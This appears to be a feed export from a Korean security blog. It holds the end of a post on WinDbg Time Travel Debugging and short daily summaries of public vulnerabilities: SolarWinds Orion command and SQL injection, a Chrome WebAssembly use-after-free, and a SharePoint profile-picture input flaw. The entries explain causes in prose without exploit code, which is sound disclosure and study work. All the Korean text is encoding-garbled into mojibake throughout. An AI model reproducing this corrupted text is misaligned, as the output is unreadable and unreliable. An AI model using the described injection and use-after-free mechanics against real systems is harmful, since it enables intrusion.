<code>.idx</code>ë¼ëŠ” íŒŒì¼ì´ 0.5GBë¥¼ ì°¨ì§€í•˜ë‹ˆ ì´ 2GBë‚˜ ì‚¬ìš©í•˜ëŠ”êµ°ìš”. MSDOCSì— ë”°ë¥´ë©´ <code>.idx</code>íŒŒì¼ì€ ë³´í†µ  <code>.run</code>íŒŒì¼ì˜ 2ë°° ì •ë„ì˜ í¬ê¸°ê°€ ëœë‹¤ê³  í•©ë‹ˆë‹¤.</p><p><img src="/2021/01/24/fabu1ous/ttd-1/7.png"></p><p>ì•ìœ¼ë¡œ ì´ <code>.run</code>íŒŒì¼ë§Œ ìˆë‹¤ë©´ ë””ë²„ê¹…ì„ í•˜ë‹¤ê°€ ë‹¤ì‹œ ë²„ê·¸ë¥¼ ì¬í˜„í•˜ëŠ” ë²ˆê±°ë¡œì›€ì„ ì—†ì•¨ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë³´í†µ ë””ë²„ê¹…í•˜ë‹¤ ì‹¤ìˆ˜í•œë‹¤ê±°ë‚˜ ì»¨íŠ¸ë¡¤ì´ ë²„ê·¸ ë°œìƒì‹œì ì„ ë„˜ì–´ê°€ë²„ë¦¬ë©´ restartê¸°ëŠ¥ì„ ì‚¬ìš©í•´ í”„ë¡œì„¸ìŠ¤ì˜ ì‹œì‘ ì‹œì ìœ¼ë¡œ ëŒì•„ê°€ì•¼ í•©ë‹ˆë‹¤. ê°„í˜¹ restartê¸°ëŠ¥ì´ ì•ˆ ë¨¹ê±°ë‚˜ ë””ë²„ê±° ìì²´ë¥¼ ì¬ì‹œì‘í•´ì•¼ í•˜ëŠ” ê²½ìš°ì—” ë²„ê·¸ë¥¼ ë˜ë‹¤ì‹œ ì¬í˜„í•´ì•¼ í•´ì„œ ìƒë‹¹íˆ ê·€ì°®ì£ . ì €ëŠ” ì´ëŸ° ê²½ìš°ì— vmì˜ ìŠ¤ëƒ…ìƒ·ì„ ì´ìš©í•˜ê±°ë‚˜ <code>.bat</code>íŒŒì¼ì„ ì‚¬ìš©í•´ ë²„ê·¸ ì¬í˜„ì„ ìë™í™” í•˜ê³¤ í–ˆìŠµë‹ˆë‹¤. ìš°ì›©â€¦</p><h1 id="TTD-ì“°ì„¸ìš”-ë‘ë²ˆ-ì“°ì„¸ìš”"><a href="#TTD-ì“°ì„¸ìš”-ë‘ë²ˆ-ì“°ì„¸ìš”" class="headerlink" title="TTD ì“°ì„¸ìš”, ë‘ë²ˆ ì“°ì„¸ìš”"></a>TTD ì“°ì„¸ìš”, ë‘ë²ˆ ì“°ì„¸ìš”</h1><p>ì§€ê¸ˆê¹Œì§€ ê°„ë‹¨í•˜ê²Œ TTDë¥¼ ì‚¬ìš©í•´ë³¸ ì œê°€ ìƒê°í•˜ëŠ” ì¥ì , ê·¸ë¦¬ê³  MSì—ì„œ ë‚´ì„¸ìš°ê³  ìˆëŠ” ì¥ì ì„ ì•Œì•„ë´…ì‹œë‹¤.</p><h2 id="Re-zeroë¶€í„°-ì‹œì‘í•˜ëŠ”-ë””ë²„ê¹…-ìš°ì›©"><a href="#Re-zeroë¶€í„°-ì‹œì‘í•˜ëŠ”-ë””ë²„ê¹…-ìš°ì›©" class="headerlink" title="Re:zeroë¶€í„° ì‹œì‘í•˜ëŠ” ë””ë²„ê¹…? ìš°ì›©"></a>Re:zeroë¶€í„° ì‹œì‘í•˜ëŠ” ë””ë²„ê¹…? ìš°ì›©</h2><p>ì•„ê¹Œ ë§ì”€ë“œë¦° ëŒ€ë¡œ ë””ë²„ê¹…í•˜ë©´ì„œ í”„ë¡œì„¸ìŠ¤ì˜ ì‹œì‘ ì‹œì ìœ¼ë¡œ ëŒì•„ê°€ëŠ” ì¼ì€ ì •ë§ ë¹ˆë²ˆíˆ ë°œìƒí•©ë‹ˆë‹¤. ì´ë˜ì„œ ìš°ë¦¬ idiothí˜•ì´ ë¦¬ë²„ì‹±ì„ ì¢‹ì•„í•˜ë‚˜ ë´ìš”. ã…‹ã…‹ã…‹ã…‹</p><p><img src="/2021/01/24/fabu1ous/ttd-1/8.png"></p><p>ë””ë²„ê±° ì¢…ë¥˜ì™€ ìƒê´€ì—†ì´ ì¡°ê¸ˆ ë§Œì ¸ë´¤ë‹¤ í•˜ì‹œëŠ” ë¶„ë“¤ì€ ìœ„ ì‚¬ì§„ì—ì„œ ê°ê° ê¸°ëŠ¥ë“¤ì´ ë¬´ìŠ¨ ë™ì‘ì„ í•˜ëŠ”ì§€ ìµìˆ™í•  ê²ë‹ˆë‹¤.</p><ol><li>GO : break point ìœ„ì¹˜ê¹Œì§€ í”„ë¡œê·¸ë¨ì„ ì‹¤í–‰</li><li>Step Out : í˜„ì¬ í•¨ìˆ˜ë¥¼ ëê¹Œì§€ ì‹¤í–‰ í›„ ë¦¬í„´</li><li>Step Into : instruction í•œê°œ ì‹¤í–‰, ë§Œì•½ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ë©´ í•¨ìˆ˜ ë‚´ë¶€ë¡œ ì§„ì…</li><li>Step Over : instruction í•œê°œ ì‹¤í–‰, ë§Œì•½ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ë©´ í•´ë‹¹ í•¨ìˆ˜ë¥¼ ëê¹Œì§€ ì‹¤í–‰í›„ ë¦¬í„´</li></ol><p>GOë¥¼ ì§„í–‰í•˜ê¸° ì „ì— break point ì„¤ì •ì„ ì˜ëª»í–ˆë‹¤ê±°ë‚˜, Step Intoë¥¼ ì‚¬ìš©í•´ í•¨ìˆ˜ ë‚´ë¶€ë¡œ ì§„ì…í•´ì•¼ í•˜ëŠ” ìƒí™©ì—ì„œ Step Overë¥¼ í•˜ê²Œ ë  ê²½ìš° ëˆˆë¬¼ì„ ë¨¸ê¸ˆê³  restartë²„íŠ¼ì„ ëˆŒëŸ¬ì•¼ í•˜ì£ . ì •ë§ ì ì‹œ ì§‘ì¤‘ì„ ì•ˆ í•˜ë©´ ë²Œì–´ì§€ëŠ” ì¼ì´ë¼ ì§œì¦ ë‚˜ê¸°ë„ í•˜ê³  break pointì˜ í•œê³„ë¥¼ ìƒê°í•´ë³´ë©´ ì—¬ê°„ ê·€ì°®ì€ ê²Œ ì•„ë‹™ë‹ˆë‹¤. TTDëŠ” ì´ëŸ° ë¶ˆí¸í•¨ì„ ì–´ë–»ê²Œ í•´ê²°í–ˆì„ê¹Œìš”?</p><h2 id="Reverse-Flow-Control"><a href="#Reverse-Flow-Control" class="headerlink" title="Reverse Flow Control"></a>Reverse Flow Control</h2><p><img src="/2021/01/24/fabu1ous/ttd-1/9.png"></p><p>TTDëŠ” ìœ„ì—ì„œ ì„¤ëª…í•œ Flow Control ê¸°ëŠ¥ì„ ë’¤ì§‘ì€ Reverse Flow Controlì„ ì œê³µí•©ë‹ˆë‹¤. ê·¸ëƒ¥ ë§ ê·¸ëŒ€ë¡œ í”„ë¡œê·¸ë¨ì˜ íë¦„ì„ ê±°ê¾¸ë¡œ ê±°ìŠ¬ëŸ¬ ì˜¬ëŸ¬ê°ˆ ìˆ˜ ìˆë‹¤ëŠ” ëœ»ì…ë‹ˆë‹¤. ì•„ê¹Œ ë§í•œ ëŒ€ë¡œ Step Intoë¥¼ í•´ì•¼ í•  ìƒí™©ì—ì„œ Step Overë¥¼ í•´ë²„ë ¤ì„œ ë¶„ì„í•´ì•¼ í•  í•¨ìˆ˜ì— ì§„ì…í•˜ì§€ ëª»í–ˆë‹¤ë©´ ë‹¨ìˆœíˆ Step Over Back í•˜ë©´ í•´ê²°ë©ë‹ˆë‹¤.</p><h2 id="Time-Travel-Position"><a href="#Time-Travel-Position" class="headerlink" title="Time Travel Position"></a>Time Travel Position</h2><p><img src="/2021/01/24/fabu1ous/ttd-1/10.png"></p><p>ê·¸ëŸ¼ ë‹¨ìˆœíˆ í˜„ì¬ program counter ìœ„ì¹˜ë¡œë¶€í„° intructionì„ ê±°ìŠ¬ëŸ¬ ì˜¬ë¼ê°€ëŠ” ê²Œ ëì´ëƒ? ê·¸ë¬ë‹¤ë©´ ì‹œê°„ì—¬í–‰(Time Travel)ì´ë€ ì´ë¦„ì´ ë¶™ì§„ ì•Šì•˜ê² ì£ . ë…¹í™” ì‹œì‘ë¶€í„° ë…¹í™” ì¢…ë£Œ ì‹œì ê¹Œì§€ ì‹¤í–‰ëœ instructionë§ˆë‹¤ Time Travel Position(ì´í•˜ TTP)ì´ë€ ê°’ì´ ë§¤ê²¨ì§€ëŠ”ë° break pointì˜ ìƒìœ„ í˜¸í™˜ì´ë¼ ìƒê°í•˜ì‹œë©´ ë©ë‹ˆë‹¤.</p><p><img src="/2021/01/24/fabu1ous/ttd-1/11.png"></p><p>ì˜ˆë¥¼ ë“¤ì–´ <code>fabulous()</code>ë¼ëŠ” í•¨ìˆ˜ê°€ ìˆê³  ì´ í•¨ìˆ˜ê°€ 16ë²ˆì§¸ í˜¸ì¶œëœ ì‹œì ì—ì„œ í•¨ìˆ˜ ë‚´ë¶€ì— ë²„ê·¸ê°€ ë°œìƒí–ˆë‹¤ê³  ê°€ì •í•´ ë´…ì‹œë‹¤. ë™ì  ë””ë²„ê¹…ì„ ìœ„í•´ <code>fabulous()</code>í•¨ìˆ˜ ì—”íŠ¸ë¦¬ì— break pointë¥¼ ê±¸ì—ˆë‹¤ë©´ í”„ë¡œì„¸ìŠ¤ì˜ ì‹œì‘ ì‹œì ë¶€í„° ë²„ê·¸ ë°œìƒ ìœ„ì¹˜ê¹Œì§€ í•´ë‹¹ break pointì— ì´ 16ë²ˆ ê±¸ë ¤ì•¼ í•©ë‹ˆë‹¤.</p><p><img src="/2021/01/24/fabu1ous/ttd-1/12.png"></p><p>ë°˜ë©´ Time Travel Positionì€ ê°™ì€ í•¨ìˆ˜ì˜ ê°™ì€ instructionì¼ì§€ë¼ë„ ì‹¤í–‰ ì‹œì ì´ ë‹¤ë¥´ë‹¤ë©´ ë‹¤ë¥¸ ê°’ì´ ë§¤ê²¨ì§‘ë‹ˆë‹¤. <code>!tt</code>ëª…ë ¹ì–´ë¥¼ ì‚¬ìš©í•´ ì„ì˜ì˜ TTPë¡œ ì´ë™í•  ìˆ˜ ìˆìœ¼ë©° í”„ë¡œì„¸ìŠ¤ì˜ ìƒíƒœë¥¼ íŠ¹ì • ì‹œì ìœ¼ë¡œ ë˜ëŒë¦´ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><h2 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2><p><img src="/2021/01/24/fabu1ous/ttd-1/13.png"></p><p>MSì—ì„œ ë‚´ì„¸ìš°ëŠ” TTDì˜ ì¥ì  ì¤‘ ì œê°€ ë‹¨ì—° ìµœê³ ë¼ ìƒê°í•˜ëŠ” ê¸°ëŠ¥ì€ ë°”ë¡œ íƒ€ì„ë¼ì¸ì…ë‹ˆë‹¤. ì²˜ìŒì—” ë™ì˜ìƒ ì¬ìƒ ë°”ì²˜ëŸ¼ ë§ˆìš°ìŠ¤ë¡œ ë“œë˜ê·¸í•˜ê±°ë‚˜ í´ë¦­í•´ì„œ ì›í•˜ëŠ” ì‹œì ìœ¼ë¡œ ê°ˆ ìˆ˜ ìˆì„ ì¤„ ì•Œì•˜ëŠ”ë° ë°˜ì€ ë§ê³  ë°˜ì€ í‹€ë¦° ìƒê°ì´ë”êµ°ìš”. ì „ì²´ í”„ë¡œê·¸ë¨ íë¦„ ì¤‘ ì£¼ìš” ì´ë²¤íŠ¸(Exception, Break Point, Function Call, Memory Access)ì˜ ìœ„ì¹˜ë¥¼ ê·¸ë¦¼ìœ¼ë¡œ í‘œí˜„í•´ ì£¼ë©° íƒ€ì„ë¼ì¸ì— í‘œì‹œëœ ê° ì´ë²¤íŠ¸ë¥¼ í´ë¦­í•˜ë©´ í”„ë¡œì„¸ìŠ¤ì˜ ìƒíƒœë¥¼ í•´ë‹¹ ì‹œì ìœ¼ë¡œ ë³€ê²½í•´ì¤ë‹ˆë‹¤. ê·¸ ì´ì™¸ì˜ ê³³ì€ í´ë¦­í•´ë„ ì´ë™ ì•ˆí•©ë‹ˆë‹¤. ã…ã…;; ë„ˆë¬´ ê¸°ëŒ€ê°€ ì»¸ë‚˜?</p><p><img src="/2021/01/24/fabu1ous/ttd-1/14.png"></p><p>ì´ë²¤íŠ¸ ì¤‘ Memory Access ê°™ì€ ê²½ìš°ì—” íŠ¹ì • ì£¼ì†Œì— íŠ¹ì • ë™ì‘(RWX)ì´ ì´ë£¨ì–´ì§ˆ ë•Œë§ˆë‹¤ íƒ€ì„ë¼ì¸ì— ê¸°ë¡ë˜ë„ë¡ ì§€ì •í•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì— ë©”ëª¨ë¦¬ ì»¤ëŸ½ì…˜ ê°™ì€ ë²„ê·¸ë¥¼ ì°¾ì„ ë•Œ ì •ë§ ìœ ìš©í•˜ê² ì£ ? ë¯¸ë””ì–´ í”Œë ˆì´ì–´ ë”± ëŒ€</p><h1 id="ë‹¨ì "><a href="#ë‹¨ì " class="headerlink" title="ë‹¨ì "></a>ë‹¨ì </h1><p><img src="/2021/01/24/fabu1ous/ttd-1/15.png"></p><p>ë­â€¦ ì‚¬ì‹¤ ë‹¨ì ì´ë¼ë©´ ë‹¨ì ì´ì§€ë§Œ ì•ì„œ ì„¤ëª…í•œ ì¥ì ë“¤ì— ë¹„í•˜ë©´ ì´ ì •ë„ëŠ” ì¶©ë¶„íˆ ê°ìˆ˜í•  ìˆ˜ ìˆë‹¤ê³  ë´…ë‹ˆë‹¤.</p><h2 id="Trace-File-í¬ê¸°"><a href="#Trace-File-í¬ê¸°" class="headerlink" title="Trace File í¬ê¸°"></a>Trace File í¬ê¸°</h2><p>ìœ„ì—ì„œ ì¬í˜„ì— 3~4ì´ˆ ê±¸ë¦¬ëŠ” ë²„ê·¸ë¥¼ ë…¹í™”í•œ ê²°ê³¼ë¡œ 2GB ì •ë„ì˜ ë””ìŠ¤í¬ ìš©ëŸ‰ì„ ì°¨ì§€í•œë‹¤ê³  í–ˆì—ˆì£ ? ë§Œì•½ ë²„ê·¸ ì¬í˜„ì—ë§Œ ëª‡ì‹­ ë¶„ì„ ì†Œëª¨í•œë‹¤ê³  ìƒê°í•˜ë©´ ì–´í›„â€¦</p><h2 id="ë…¹í™”ì¤‘-ì˜¤ë²„í—¤ë“œ"><a href="#ë…¹í™”ì¤‘-ì˜¤ë²„í—¤ë“œ" class="headerlink" title="ë…¹í™”ì¤‘ ì˜¤ë²„í—¤ë“œ"></a>ë…¹í™”ì¤‘ ì˜¤ë²„í—¤ë“œ</h2><p>ì‚¬ìš©í•˜ëŠ” ì‹œìŠ¤í…œì˜ ì‚¬ì–‘ì´ë‚˜ ë…¹í™” ì¤‘ ì‹¤í–‰í•˜ëŠ” ì½”ë“œì˜ ì–‘ì— ë”°ë¼ ì²œì°¨ë§Œë³„ì¸ ë°ë‹¤ ë°©ê¸ˆ ì–¸ê¸‰í•œ Trace Fileì˜ í¬ê¸°ì— ì§ê²°ë˜ëŠ” ë¬¸ì œë¼ ì›¬ë§Œí•˜ë©´ ìµœëŒ€í•œ ì¢‹ì€ í™˜ê²½ì—ì„œ ë¹¨ë¦¬ ë…¹í™”ë¥¼ ëë‚´ë„ë¡ í•©ì‹œë‹¤.</p><h2 id="Read-only-Debugging"><a href="#Read-only-Debugging" class="headerlink" title="Read-only Debugging"></a>Read-only Debugging</h2><p>ë‹¹ì—°í•œ ì´ì•¼ê¸°ì§€ë§Œ í”„ë¡œì„¸ìŠ¤ì˜ ì‹¤í–‰ì„ ë…¹í™”í•˜ê³  ëŒë ¤ë³´ëŠ” ê²Œ TTDë¼ ë‹¤ë¥¸ ë””ë²„ê±°ë“¤ì²˜ëŸ¼ íŠ¹ì • ë ˆì§€ìŠ¤í„°ë‚˜ ë©”ëª¨ë¦¬ì— ê°’ì„ ì„ì‹œë¡œ ë³€ê²½í•˜ëŠ” ì‘ì—…ì€ ëª»í•´ë´…ë‹ˆë‹¤.</p><h2 id="ê¶Œí•œ"><a href="#ê¶Œí•œ" class="headerlink" title="ê¶Œí•œ"></a>ê¶Œí•œ</h2><p>ì•„ì§ê¹Œì§„ TTDë¡œ User-mode í”„ë¡œì„¸ìŠ¤ë§Œ ë…¹í™”ê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤. Kernel-mode í”„ë¡œì„¸ìŠ¤ëŠ” ì•ˆëœë‹¤ê³  í•©ë‹ˆë‹¤.</p><h1 id="ë§ˆì¹˜ë©°"><a href="#ë§ˆì¹˜ë©°" class="headerlink" title="ë§ˆì¹˜ë©°"></a>ë§ˆì¹˜ë©°</h1><p><img src="/2021/01/24/fabu1ous/ttd-1/16.png"></p><p>ì´ë²ˆ ê¸€ì€ ê±°ì˜ ë­ ì—°êµ¬ê¸€ì´ë¼ê¸° ë³´ë‹¨ ë²ˆì—­ê¸€ ìˆ˜ì¤€ì—ì„œ ëë‚œ ê±° ê°™ë„¤ìš”. ë‹¤ìŒ ê¸€ì—ì„  ì‹¤ì œë¡œ ë²„ê·¸ë¥¼ ë¶„ì„í•´ë³´ëŠ” ì‹¤ìŠµì„ í•´ë³´ê² ìŠµë‹ˆë‹¤. ì•„ë§ˆ êµ¬ë²„ì „ ì˜¤í”ˆì†ŒìŠ¤ì—ì„œ ë°œìƒí•˜ëŠ” ë²„ê·¸ë‚˜ MSDOCSì—ì„œ TTD ì—°ìŠµìš©ìœ¼ë¡œ ì œê³µí•˜ëŠ” í”„ë¡œê·¸ë¨ì„ ì‚¬ìš©í•  ê±° ê°™ìŠµë‹ˆë‹¤. ì•„ë‹ˆë©´ ì•„ì˜ˆ ë‹¤ë¥¸ í”„ë¡œê·¸ë¨ì„ ë¶„ì„í•´ ë³¼ ìˆ˜ë„ ìˆê³ , ì•„ì§ ì •í•´ì§„ ê±´ ì—†ìŠµë‹ˆë‹¤. ê·¸ë•Œê¹Œì§€ ì €ëŠ” í¬ë˜ì‰¬ ë¶„ì„í•˜ë©´ì„œ TTDë¥¼ ìµí˜€ì˜¬ê²Œìš”. ì·¨ì•½ì ë„ ì°¾ê³ â€¦ ã…ã…;;</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>windbg</tag>
      
      <tag>time travel debugging</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Three Bugs in Orion&#39;s belt</title>
    <link href="/2021/01/23/fabu1ous/2021-01-23/"/>
    <url>/2021/01/23/fabu1ous/2021-01-23/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/1/20/three-bugs-in-orions-belt-chaining-multiple-bugs-for-unauthenticated-rce-in-the-solarwinds-orion-platform">Three bugs in orionâ€™s belt: Chaining multiple bugs for rce</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>SolarWinds Orion Platform</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ZDIì—ì„œ <a href="https://www.solarwinds.com/securityadvisory#anchor1">SunBurst</a> ì‚¬ê±´ê³¼ ê´€ë ¨ëœ 3ê°€ì§€ ì·¨ì•½ì ì˜ ì„¸ë¶€ ì •ë³´ë¥¼ ê³µê°œí–ˆìŠµë‹ˆë‹¤. </p><ul><li><p>CVE-2020-14005</p><p>Alert Management ê¶Œí•œì„ ê°€ì§„ SolarWinds ì‚¬ìš©ìëŠ” SolarWinds Orion Platformì˜ web-based GUI í˜¹ì€ REST APIë¥¼ í†µí•´ ê´€ë¦¬ì ê¶Œí•œìœ¼ë¡œ ì›ê²© ì½”ë“œ ì‹¤í–‰ì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. Alert Management ê¶Œí•œì„ ê°€ì§„ ì‚¬ìš©ìëŠ” ë„¤íŠ¸ì›Œí¬ ì´ë²¤íŠ¸ë¥¼ ì²˜ë¦¬í•  VBS scriptì˜ ê²½ë¡œë¥¼ ì§€ì •í•  ìˆ˜ ìˆëŠ”ë°, ì´ VBS scriptë¥¼ í•´ì„í•˜ê³  ì‹¤í–‰í•  interpreterì˜ ê²½ë¡œ ë˜í•œ API requestì˜ ë‚´ìš©ì„ ì¡°ì‘í•´ ì„ì˜ë¡œ ì„¤ì •ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤. ë”°ë¼ì„œ interpreter ëŒ€ì‹  cmd.exeë¥¼ ì‹¤í–‰í•´ command injectionì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p></li></ul><ul><li><p>CVE-2020-27869</p><p>íŠ¹ì • ë„¤íŠ¸ì›Œí¬ ì´ë²¤íŠ¸ ë°œìƒ ì‹œ ì„œë²„ë¡œ ë³´ë‚¼ GET í˜¹ì€ POST Requestë¥¼ Configure Action ê¸°ëŠ¥ìœ¼ë¡œ ì„¤ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í•´ë‹¹ ê¸°ëŠ¥ì—ì„œ SQL injectionì´ ê°€ëŠ¥í•´ ê´€ë¦¬ì ê³„ì •ì„ íƒˆì·¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs reasonml">...<span class="hljs-keyword">if</span> (messageWithMacros.<span class="hljs-constructor">Contains(<span class="hljs-string">&quot;$&#123;SQL:&quot;</span>)</span>)&#123;                     MacroParser.<span class="hljs-constructor">PrepareMacroStringForSQL(<span class="hljs-params">ref</span> <span class="hljs-params">messageWithMacros</span>)</span>;&#125;...</code></pre><p>ì„œë²„ì— ë³´ë‚¼ POST requestë¥¼ ì„ì˜ì˜ ë¬¸ìì—´ë¡œ ì§€ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë§Œì•½ í•´ë‹¹ ë¬¸ìì—´ì´ <code>$&#123;SQL:</code>ë¥¼ í¬í•¨í•˜ë©´ ê·¸ ë’¤ì— ë”°ë¼ì˜¤ëŠ” ë¬¸ìì—´ì„ SQL statementë¡œ ì¸ì‹í•˜ê³  ì²˜ë¦¬í•˜ê²Œ ë©ë‹ˆë‹¤.</p></li></ul><ul><li><a href="https://hackyboiz.github.io/2021/01/02/fabu1ous/2021-01-02/">CVE-2020-10148</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-15994 : Chrome WebAssembly Engine UAF ì·¨ì•½ì </title>
    <link href="/2021/01/22/l0ch/2021-01-22/"/>
    <url>/2021/01/22/l0ch/2021-01-22/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.br0vvnn.io/pages/blogpost.aspx?id=5">Exploiting CVE-2020-15994 Chrome WebAssembly Engine UAF Vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Google Chrome WebAssembly</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Google Chromeì˜ V8 WebAssembly ì—”ì§„ì—ì„œ ë°œê²¬ëœ UAF ì·¨ì•½ì ì— ëŒ€í•œ ìƒì„¸ ì •ë³´ê°€ ê³µê°œë˜ì—ˆìŠµë‹ˆë‹¤. WebAssemblyëŠ” JSì˜ ë‹¨ì ì„ ë³´ì™„í•˜ê¸° ìœ„í•´ ë¸Œë¼ìš°ì €ì—ì„œ ì €ìˆ˜ì¤€ ì–¸ì–´ë¡œ ì‘ì„±ëœ ì½”ë“œë¥¼ ì»´íŒŒì¼í•´ ë„¤ì´í‹°ë¸Œë¡œ ë™ì‘í•  ìˆ˜ ìˆë„ë¡ í•˜ëŠ” ê¸°ìˆ  í‘œì¤€ì…ë‹ˆë‹¤.</p><p>WebAssemblyì˜ <code>AsyncCompileJob</code> ê°ì²´ëŠ” <code>WebAssembly.instantiateStreaming</code> í•¨ìˆ˜ì—ì„œ ì‚¬ìš©ë˜ëŠ” ê¸°ë³¸ V8 ê°ì²´ì´ë©° WebAssemblyì˜ ë¹„ë™ê¸° ì»´íŒŒì¼ì„ ì§€ì›í•©ë‹ˆë‹¤. </p><p>ì·¨ì•½ì ì„ íŠ¸ë¦¬ê±°í•˜ëŠ” ë° ì‚¬ìš©ë˜ëŠ” í•¨ìˆ˜ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><p><code>AsyncCompileJob::FinishModule</code> - ì»´íŒŒì¼ëœ WebAssembly ì½”ë“œë¥¼ Javascript ê°ì²´ë¡œ ì¸ìŠ¤í„´ìŠ¤ í™”í•¨<br><code>AsyncCompileJob::Abort</code> - WebAssembly ì½”ë“œ ë‹¤ìš´ë¡œë“œ ì‹¤íŒ¨ ì‹œ í˜¸ì¶œë˜ë©° ëª¨ë“  ì»´íŒŒì¼ í”„ë¡œì„¸ìŠ¤ë¥¼ ì·¨ì†Œí•¨<br>ìœ„ ë‘ í•¨ìˆ˜ëŠ” ëª¨ë‘ <code>AsyncCompileJob</code> ê°ì²´ë¥¼ í•´ì œí•˜ëŠ” ê¸°ëŠ¥ì´ ìˆìŠµë‹ˆë‹¤.</p><p><code>WebAssembly.instantiateStreaming</code> í•¨ìˆ˜ë¥¼ ì´ìš©í•˜ì—¬ WebAssembly ì½”ë“œë¥¼ ì»´íŒŒì¼í•˜ëŠ” ê²½ìš° WebAssembly ì½”ë“œì—ì„œ Javascript í•¨ìˆ˜ ë° ê°ì²´ì— ì ‘ê·¼í•˜ê¸° ìœ„í•œ ì¸í„°í˜ì´ìŠ¤ë¡œ <code>importObject</code>ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. ì´ë•Œ <code>importObject</code>ì— Getterë¥¼ ì •ì˜í•˜ë©´ <code>InstanceBuilder::SanitizeImports</code> í•¨ìˆ˜ëŠ” Getter í•¨ìˆ˜ë¥¼ ì½œë°±ìœ¼ë¡œ í˜¸ì¶œí•©ë‹ˆë‹¤.</p><p>Getterë¥¼  <code>AsyncCompileJob::Abort</code> ë¡œ ì •ì˜í•´ ì½œë°± í•¨ìˆ˜ë¡œ í˜¸ì¶œí•˜ë©´ <code>AsyncCompileJob::FinishModule</code> í•¨ìˆ˜ ì´í›„ í•´ì œëœ <code>AsyncCompileJob</code> ê°ì²´ì— ì ‘ê·¼í•  ìˆ˜ ìˆì–´ UAFë¥¼ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>chrome</tag>
      
      <tag>L0ch</tag>
      
      <tag>uaf</tag>
      
      <tag>webassembly</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-1456 : Unvalidated User Input in MS SharePoint</title>
    <link href="/2021/01/21/idioth/2021-01-21/"/>
    <url>/2021/01/21/idioth/2021-01-21/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://slashcrypto.org/2021/01/15/CVE-2020-1456/">INSERTION OF MALICIOUS LINKS FOR EXECUTION IN PROFILE PICTURE - UNVALIDATED USER INPUT IN MS SHAREPOINT 2019 (CVE-2020-1456)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>2020ë…„ 7ì›” 14ì¼ íŒ¨ì¹˜ ì´ì „ ë²„ì „<ul><li>Microsoft SharePoint Server 2010 Service Pack 2</li><li>Microsoft SharePoint Server 2019</li><li>Microsoft SharePoint Enterprise Server 2013 Service Pack 1</li><li>Microsoft SharePoint Enterprise Server 2016</li></ul></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft SharePoint Serverì—ì„œ ìœ ì € í”„ë¡œí•„ ì‚¬ì§„ì— ì„ì˜ì˜ ë§í¬ë¥¼ ì‚½ì…í•˜ì—¬ í”„ë¡œí•„ ì‚¬ì§„ì´ ì‚½ì…ëœ í˜ì´ì§€ë¥¼ ë°©ë¬¸í•˜ëŠ” ì‚¬ëŒë“¤ì„ ëª¨ë‘ ê³µê²©í•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. SharePointëŠ” ë§ˆì´í¬ë¡œì†Œí”„íŠ¸ ì˜¤í”¼ìŠ¤ ì„œë²„ ì œí’ˆêµ°ì˜ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ í”Œë«í¼ìœ¼ë¡œ ê¸°ì—…ì´ë‚˜ ì¡°ì§ì—ì„œ ê³µë™ ì‘ì—…, ì •ë³´ ì œê³µ ë“±ì˜ í˜‘ì—… ì‚¬ì´íŠ¸ êµ¬ì¶•ì— ì‚¬ìš©ë©ë‹ˆë‹¤.</p><p>SharePointì˜ ìœ ì € í”„ë¡œí•„ ì„¤ì •ì´ í™œì„±í™”ë˜ì–´ ìˆìœ¼ë©´, ì‚¬ìš©ìëŠ” í”„ë¡œí•„ ì‚¬ì§„ì„ ì—…ë¡œë“œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í”„ë¡œí•„ ì‚¬ì§„ì„ ì˜¬ë¦¬ê³  ì ìš©í•˜ê¸° ì „ì— ëª¨ë“  ë³€ê²½ ì‚¬í•­ì„ ì €ì¥í•  ìˆ˜ 